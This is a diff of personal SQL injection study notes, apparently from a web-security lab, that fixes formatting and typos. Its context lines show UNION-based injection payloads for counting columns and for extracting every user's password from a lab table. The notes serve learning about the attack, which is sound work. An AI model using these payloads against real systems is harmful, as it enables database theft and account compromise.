@@ -75,7 +75,7 @@ OR
 it will always be true and we get entire DB
 
 ------
-If we use UNION we can only select same number of columns as in first query eg:
+***If we use UNION we can only select same number of columns as in first query eg:
 
 Select username,passwd UNION Select passwd,age from ...
 
@@ -83,7 +83,7 @@ Select username,passwd UNION Select passwd,age from ...
 
 --------
 
-##To find number of columns in target DB
+## To find number of columns in target DB
 
 i/p:
 jeremy' union select null#
@@ -195,7 +195,7 @@ Username: - Email: bobspassword
 we get all passwords and not just jeremy's
 
 
-sometimes null dosent work so we need to add dat type of the column
+sometimes null dosent work so we need to add data type of the column
 
 **jeremy' union select null(int),null,password from injection0x01#**
 
